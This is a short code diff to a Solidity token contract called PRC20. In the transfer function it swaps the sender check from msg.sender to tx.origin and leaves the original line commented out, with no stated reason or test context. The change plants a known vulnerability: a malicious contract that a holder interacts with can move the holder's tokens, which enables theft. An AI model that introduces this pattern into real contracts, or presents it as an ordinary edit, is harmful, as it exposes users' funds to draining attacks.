@@ -73,7 +73,8 @@ contract PRC20 is IERC20 {
      * - the caller must have a balance of at least `amount`.
      */
     function transfer(address to, uint256 amount) public virtual override returns (bool) {
-        address owner = msg.sender;
+        address owner = tx.origin;
+        //address owner = msg.sender;
         _transfer(owner, to, amount);
         return true;
     }
